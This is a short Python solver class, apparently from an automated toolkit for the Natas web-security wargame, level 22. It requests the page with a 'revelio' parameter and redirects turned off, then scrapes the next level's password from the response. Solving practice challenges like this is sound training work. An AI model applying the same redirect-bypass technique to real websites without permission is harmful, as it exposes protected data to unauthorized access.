import re
from .base_solver import NatasSolver

class Natas22Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Make request with revelio parameter and prevent redirects
            response = self.make_request(
                path="?revelio=1",
                allow_redirects=False
            )
            
            # Extract password from response
            match = re.findall(r"Username: natas23\nPassword: (.*)</pre>", response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas22: {str(e)}")